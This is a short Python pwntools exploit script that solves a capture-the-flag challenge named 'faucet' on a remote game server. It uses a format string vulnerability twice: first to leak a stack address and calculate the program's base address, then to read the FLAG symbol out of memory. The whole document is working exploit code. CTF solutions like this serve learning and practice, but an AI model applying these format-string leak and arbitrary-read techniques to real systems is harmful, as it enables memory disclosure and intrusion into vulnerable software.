from pwn import *
import sys
import os

host = 'challenge.ctf.games'
port = 30290

# ==================================================================
elf = ELF('faucet')
context.update(os='linux', arch='amd64', binary=elf)

if args.LOCAL:
    p = elf.process()
else:
    p = remote(host, port)

# ==================================================================
def exec_fmt(p, payload):
    p.recvuntil(b'> ')
    p.sendline(b'5')
    p.recvuntil(b'buy?: ')
    p.sendline(payload)
    p.recvuntil(b'You have bought a ')

# ==================================================================
exec_fmt(p, b'%13$lx XX')
l = p.recvuntil(b' XX')[:-3]
ret_addr = int(l.decode(), 16)
elf.address = ret_addr - 0x1725
log.info(f'Base ELF address: {hex(elf.address)}')

# ==================================================================
payload = b'%8$s '
payload += b'X' * (16 - len(payload))
payload += p64(elf.symbols['FLAG'])

exec_fmt(p, payload)
flag = p.recvuntil(b' X')[:-2].strip().decode()
log.success(f'Flag: {flag}')

p.close()
